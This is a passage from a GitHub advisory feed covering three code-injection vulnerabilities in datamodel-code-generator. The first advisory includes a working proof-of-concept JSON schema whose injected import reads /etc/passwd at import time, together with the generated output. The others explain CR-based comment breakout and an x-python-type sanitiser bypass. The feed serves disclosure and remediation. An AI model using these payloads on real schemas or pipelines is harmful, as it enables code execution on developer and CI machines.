-<p>Self contained POC available here: <a href="https://gist.github.com/thegr1ffyn/c3abb41bb89c164daa0d5f2c60b5328b">https://gist.github.com/thegr1ffyn/c3abb41bb89c164daa0d5f2c60b5328b</a></p>
-<p>Default invocation, no special flags, on the patched release (commit <code>227ffe85ee2dcfc79336fbb14ad64c02a166b65a</code>, v0.61.0).</p>
-<p><code>payload_a.json</code>:</p>
-<pre><code class="language-json">{
-  "type": "object",
-  "title": "Root",
-  "required": ["f"],
-  "properties": { "f": { "$ref": "#/$defs/Evil" } },
-  "$defs": {
-    "Evil": {
-      "type": "object",
-      "x-python-import": {
-        "module": "os",
-        "name": "getcwd\nprint(*open('/etc/passwd'),file=open('/tmp/dmcg_xpi_loot','w'),sep='',end='')"
-      }
-    }
-  }
-}
-</code></pre>
-<p>Generate and import:</p>
-<pre><code class="language-bash">datamodel-codegen --input payload_a.json --input-file-type jsonschema --output model.py
-python -c "import model"
-</code></pre>
-<p>Generated <code>model.py</code> (verbatim, the breakout sits at module scope):</p>
-<pre><code class="language-python">from __future__ import annotations
-
-from os import getcwd
-
-print(*open('/etc/passwd'), file=open('/tmp/dmcg_xpi_loot', 'w'), sep='', end='')
-from os import getcwd
-
-print(*open('/etc/passwd'), file=open('/tmp/dmcg_xpi_loot', 'w'), sep='', end='')
-from pydantic import BaseModel
-...
-</code></pre>
-<p>Importing <code>model</code> reads <code>/etc/passwd</code> and writes an exact copy to <code>/tmp/dmcg_xpi_loot</code>:</p>
-<pre><code>$ head -1 /tmp/dmcg_xpi_loot
-root:x:0:0:root:/root:/bin/bash
-</code></pre>
-<p>Confirmed under both the default output (pydantic v1) and <code>--output-model-type pydantic_v2.BaseModel</code>. The <code>customTypePath</code> variant reproduces identically:</p>
-<pre><code class="language-json">{ "type":"object","title":"Root","required":["f"],
-  "properties":{ "f":{ "type":"object",
-    "customTypePath":"os.getcwd\nprint(*open('/etc/passwd'),file=open('/tmp/dmcg_ctp_loot','w'),sep='',end='')" }}}
-</code></pre>
-<p>A benign control (<code>x-python-import: {"module":"decimal","name":"Decimal"}</code>) produces clean <code>from decimal import Decimal</code> and no execution. A complete self-contained validation harness, <code>run.sh</code> plus <code>control.json</code>, <code>payload_a.json</code>, <code>payload_b.json</code>, is included alongside this advisory (CONTROL clean + three payloads firing + verdict + cleanup).</p>
-<p><strong>Suggested fix.</strong> Validate every dotted segment of <code>module</code>, <code>name</code>, and <code>customTypePath</code> as a Python identifier before building the import (reuse <code>validators._validate_dotted_python_identifier_path</code>), and/or reject non-identifier paths centrally inside <code>Import.from_full_path</code>.</p>
-<h4 id="impact">Impact</h4>
-<p>Arbitrary code execution at model-import time, driven by attacker-controlled schema content under the default configuration. Anyone who runs datamodel-code-generator on an untrusted or third-party schema, multi-tenant code-generation services, CI pipelines that ingest external specs, or a developer generating models from a public/vendor OpenAPI/JSON-Schema document, and then imports (or whose tooling imports) the generated module, executes the attacker's code with the importing process's privileges. The PoC demonstrates arbitrary local file read (<code>/etc/passwd</code>); the same primitive yields full RCE.</p>
-<h3 id="maintainer-status">Maintainer status</h3>
-<p>Confirmed by maintainer review and regression tests. A private fix PR is open and should be merged before publishing this advisory: <a href="https://github.com/koxudaxi/datamodel-code-generator-ghsa-5578-w22f-pfx9/pull/1">https://github.com/koxudaxi/datamodel-code-generator-ghsa-5578-w22f-pfx9/pull/1</a></p>
-<p>Fix summary: validate <code>x-python-import</code> and <code>customTypePath</code> values as dotted Python identifier paths before using them in generated imports or type paths.</p>
-<p>Release status: not fixed in <code>0.63.0</code>; <code>customTypePath</code> was introduced in <code>0.11.6</code>, so affected versions are <code>&gt;= 0.11.6, &lt;= 0.63.0</code>. This advisory should remain unpublished until the private PR is merged and a patched release is available.</p>
-<p>Validation: <code>uv run --group test --extra http pytest tests/main/jsonschema/test_main_jsonschema.py tests/parser/test_jsonschema.py</code> passed locally; <code>uv run --group fix ruff check src/datamodel_code_generator/parser/jsonschema.py tests/main/jsonschema/test_main_jsonschema.py</code> passed.</p>
-<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-5578-w22f-pfx9">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-5578-w22f-pfx9</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/577d49569c2254c371a97e495020ae2238a73b84">https://github.com/koxudaxi/datamodel-code-generator/commit/577d49569c2254c371a97e495020ae2238a73b84</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.64.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.64.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-5578-w22f-pfx9">https://github.com/advisories/GHSA-5578-w22f-pfx9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-5578-w22f-pfx9</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:40:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[datamodel-code-generator] `datamodel-code-generator` vulnerable to code injection via unescaped carriage return in GraphQL Union description]]></title>
-        <id>https://github.com/advisories/GHSA-j884-q54q-mmx3</id>
-        <link href="https://github.com/advisories/GHSA-j884-q54q-mmx3"/>
-        <updated>2026-07-28T21:35:51.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>datamodel-code-generator</code> is vulnerable to code injection when generating Python models from an attacker-controlled GraphQL schema. A description on a Union type, written in the regular-string form (<code>"..."</code>) with a literal <code>\r</code> escape, is rendered into a Python <code>#</code> comment by a Jinja2 filter that handles only <code>\n</code>. Python's tokenizer treats a bare CR as a physical-line terminator, so the comment ends at the <code>\r</code> and the text after it is parsed as module-level Python. The injected code executes at <code>import</code> time of the generated <code>.py</code>, in the context of any consumer that imports the model. No special CLI flags are required.</p>
-<p>This affects versions <code>&gt;=0.25.0, &lt;0.60.1</code> and is fixed in <code>0.60.1</code>.</p>
-<h3 id="details">Details</h3>
-<p>The vulnerable output was generated by the GraphQL Union templates:</p>
-<ul>
-<li><code>src/datamodel_code_generator/model/template/UnionTypeStatement.jinja2</code></li>
-<li><code>src/datamodel_code_generator/model/template/UnionTypeAliasAnnotation.jinja2</code></li>
-<li><code>src/datamodel_code_generator/model/template/UnionTypeAliasType.jinja2</code></li>
-</ul>
-<p>Before <code>0.60.1</code>, Union descriptions were rendered as Python comments using logic equivalent to <code># {{ description | replace('\n', '\n# ') }}</code>.</p>
-<p>The Jinja2 <code>replace</code> filter handled <code>\n</code>, but bare <code>\r</code> was not normalized. Python's lexical analysis treats CR, LF, and CRLF as physical line terminators. As a result, a malicious GraphQL schema could cause the generated Python comment to end early and emit attacker-controlled text as module-level Python code.</p>
-<p>The <code>description</code> value reaches Union generation from <code>graphql-core</code> through <code>description=union_object.description</code>. GraphQL regular string values can contain <code>\r</code> escapes, and <code>graphql-core</code> preserves that value. Block strings are not affected in the same way because their line endings are normalized before reaching code generation.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker who can provide or influence a GraphQL schema processed by <code>datamodel-code-generator</code> could cause arbitrary Python code to be generated into the output file. That code would execute with the privileges of the process importing the generated model.</p>
-<p>This can affect developers, CI pipelines, or applications that run <code>datamodel-codegen --input-file-type graphql</code> on untrusted or third-party GraphQL schemas and then import the generated Python module.</p>
-<p>No custom templates, special CLI flags, or remote reference options are required.</p>
-<h3 id="remediation">Remediation</h3>
-<p>Upgrade to <code>datamodel-code-generator</code> <code>0.60.1</code> or later.</p>
-<p>The fix normalizes carriage returns in GraphQL Union descriptions before rendering them as Python comments, so injected text remains inside the comment block.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The fix applies <code>comment_safe</code> to GraphQL Union descriptions before template rendering. It normalizes CRLF and bare CR to LF so the existing Union comment templates keep the whole description inside the generated Python comment block.</p>
-<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-j884-q54q-mmx3">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-j884-q54q-mmx3</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.1">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-j884-q54q-mmx3">https://github.com/advisories/GHSA-j884-q54q-mmx3</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j884-q54q-mmx3</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:35:49.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[datamodel-code-generator] `datamodel-code-generator` vulnerable to code execution on import via `x-python-type` JSON-Schema extension in datamodel-code-generator]]></title>
-        <id>https://github.com/advisories/GHSA-m34r-v34r-rf9q</id>
-        <link href="https://github.com/advisories/GHSA-m34r-v34r-rf9q"/>
-        <updated>2026-07-28T21:34:00.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>datamodel-code-generator</code> honours a custom <code>x-python-type</code> JSON-Schema extension that lets a schema author override the generated Python type for a field. The value is forwarded verbatim into the generated Python source as the field annotation, with a single sanitisation pass that is trivial to bypass. An attacker who controls a JSON Schema fed to <code>datamodel-codegen</code> can therefore embed an arbitrary Python statement in the generated module, which executes at class-definition time the moment the developer imports the file. No <code>--extra-template-data</code> and no special flags are required; the vulnerable code is reachable with default settings.</p>
-<h3 id="details">Details</h3>
-<p>Sink: <code>src/datamodel_code_generator/parser/jsonschema.py</code>, <code>_get_python_type_override</code> (lines 2055–2096, at tag <code>0.60.1</code> / commit <code>a321547e</code>):</p>
-<pre><code class="language-python">def _get_python_type_override(self, obj: JsonSchemaObject) -&gt; DataType | None:
-    x_python_type = obj.extras.get("x-python-type")
-    if not x_python_type or not isinstance(x_python_type, str):
-        return None
-    schema_type = obj.type if isinstance(obj.type, str) else None
-    if self._is_compatible_python_type(schema_type, x_python_type):
-        return None
-    base_type = self._get_python_type_base(x_python_type)
-    import_ = self._resolve_type_import(base_type)
-    type_str = x_python_type
-    prefix = x_python_type.split("[", maxsplit=1)[0]
-    if "." in prefix:                                  # only sanitiser
-        type_str = base_type + x_python_type[len(prefix):]
-        ...
-    ...
-    result = self.data_type(type=type_str, import_=import_)
-    ...
-    return result
-</code></pre>
-<p><code>DataType.type</code> flows unescaped into <code>{{ field.type_hint }}</code> in every model template
-(<code>model/template/pydantic_v2/BaseModel.jinja2</code>,
-<code>model/template/dataclass.jinja2</code>,
-<code>model/template/TypedDictClass.jinja2</code>,
-<code>model/template/msgspec.jinja2</code>, …).</p>
-<p>The only sanitiser — the dot-rewrite at the marked line — fires only when <code>.</code> is in the substring <strong>before the first <code>[</code></strong> in the value. Placing <code>[</code> early (e.g. <code>X[1]; &lt;payload&gt;</code>) keeps <code>prefix == "X"</code> so the rewrite is skipped and the whole value lands in the generated annotation.</p>
-<p><code>from __future__ import annotations</code> (emitted by default) makes the <code>X[1]</code> portion a lazy string, so <code>X</code> does not need to resolve at runtime. Everything after <code>;</code> is parsed as a real statement in the class body and is executed when the class is constructed during <code>import</code>.</p>
-<p>Output-model types confirmed vulnerable in testing: <code>pydantic_v2.BaseModel</code>, <code>dataclasses.dataclass</code>, <code>typing.TypedDict</code>. <code>msgspec.Struct</code> emits structurally identical code.</p>
-<h3 id="poc">PoC</h3>
-<p>A self-contained PoC is available at: <a href="https://gist.github.com/thegr1ffyn/1a7ff2561a581074c49785230b2c5700">https://gist.github.com/thegr1ffyn/1a7ff2561a581074c49785230b2c5700</a></p>
-<h3 id="impact">Impact</h3>
-<p>Arbitrary code execution in the developer's interpreter / CI runner as soon as the generated module is imported. Reachable from any workflow that ingests an untrusted JSON Schema:</p>
-<ul>
-<li>OpenAPI / JSON-Schema documents fetched from third-party services or public registries.</li>
-<li>Customer-supplied schemas in B2B platforms that auto-generate client SDKs from user input.</li>
-<li>Schema files added by a malicious commit in a polyglot repository that triggers CI code generation.</li>
-</ul>
-<p>The compromise is silent: the schema is valid JSON, the generator emits syntactically clean Python (the trojan statement is a single indented line in the class body), and only the <em>use</em> of the generated file triggers the payload.</p>
-<p>Anyone running <code>datamodel-codegen</code> against an attacker-supplied schema is impacted. CI runners and developer workstations are the primary blast radius.</p>
-<h3 id="resolution">Resolution</h3>
-<p>The fix validates <code>x-python-type</code> before constructing the generated type annotation. The value is parsed with <code>ast.parse(..., mode="eval")</code> and accepted only when the AST is shaped like a Python type annotation, including names, attributes, subscripts, tuple/list annotation arguments, <code>|</code> unions, and safe literal values where annotation syntax allows them. Statements, calls, and other executable expressions are rejected before code generation. The validator is cached to avoid repeated AST parsing for repeated values.</p>
-<h3 id="remediation">Remediation</h3>
-<p>Upgrade to <code>datamodel-code-generator</code> <code>0.60.2</code> or later.</p>
-<p>This issue affects <code>datamodel-code-generator</code> versions <code>&gt;= 0.51.0, &lt;= 0.60.1</code> and is fixed in <code>0.60.2</code>.</p>
-<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-m34r-v34r-rf9q">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-m34r-v34r-rf9q</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/2c93c9b712f43391dcfa975a1e4aa0b7c93ccbba">https://github.com/koxudaxi/datamodel-code-generator/commit/2c93c9b712f43391dcfa975a1e4aa0b7c93ccbba</a></li>
-<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-m34r-v34r-rf9q">https://github.com/advisories/GHSA-m34r-v34r-rf9q</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m34r-v34r-rf9q</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-28T21:33:57.000Z</published>
     </entry>
 </feed>
